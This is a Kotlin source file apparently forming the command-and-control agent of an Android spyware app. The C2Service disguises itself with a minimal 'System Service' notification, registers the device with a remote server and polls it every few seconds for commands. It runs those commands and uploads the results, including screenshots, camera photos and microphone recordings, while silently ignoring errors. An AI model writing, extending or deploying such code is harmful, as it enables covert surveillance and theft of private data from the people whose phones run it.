package com.outcome.c2

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class C2Service : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val deviceId: String by lazy { DeviceInfo.id(this) }
    private lateinit var serverUrl: String

    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotification())
        serverUrl = getSharedPreferences("c2", MODE_PRIVATE)
            .getString("server_url", BuildConfig.C2_URL)!!
        scope.launch { registerLoop() }
        scope.launch { pollLoop() }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel("c2", "System", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, "c2")
            .setContentTitle("System Service")
            .setContentText("running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private suspend fun registerLoop() {
        while (currentCoroutineContext().isActive) {
            try {
                val info = DeviceInfo.snapshot(this, deviceId)
                postJson("$serverUrl/api/agent/register", info)
            } catch (_: Exception) {}
            delay(30_000)
        }
    }

    private suspend fun pollLoop() {
        while (currentCoroutineContext().isActive) {
            try {
                val body = JSONObject().put("device_id", deviceId)
                val resp = postJson("$serverUrl/api/agent/poll", body)
                val cmds = resp?.optJSONArray("commands") ?: JSONArray()
                for (i in 0 until cmds.length()) {
                    val cmd = cmds.getJSONObject(i)
                    scope.launch { execute(cmd) }
                }
            } catch (_: Exception) {}
            delay(5_000)
        }
    }

    private suspend fun execute(cmd: JSONObject) {
        val id = cmd.getInt("id")
        val type = cmd.getString("type")
        val args = cmd.optJSONObject("args") ?: JSONObject()
        val result = try {
            CommandExecutor.run(this, type, args)
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "unknown")
        }
        val payload = JSONObject()
            .put("command_id", id)
            .put("device_id", deviceId)
            .put("success", !result.has("error"))
            .put("result", result)
        try { postJson("$serverUrl/api/agent/result", payload) } catch (_: Exception) {}

        val dataB64 = result.optString("data_b64", "")
        if (dataB64.isNotEmpty()) {
            val category = when (type) {
                "screenshot" -> "screenshot"
                "camera_photo" -> "camera"
                "mic_record" -> "mic"
                else -> "misc"
            }
            try {
                Uploader.uploadB64(this, serverUrl, deviceId, id, category, dataB64, "$type.jpg")
            } catch (_: Exception) {}
        }
    }

    private suspend fun postJson(url: String, body: JSONObject): JSONObject? =
        withContext(Dispatchers.IO) {
            val req = Request.Builder()
                .url(url)
                .addHeader("X-Api-Key", BuildConfig.API_KEY)
                .post(body.toString().toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { r ->
                r.body?.string()?.let { JSONObject(it) }
            }
        }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
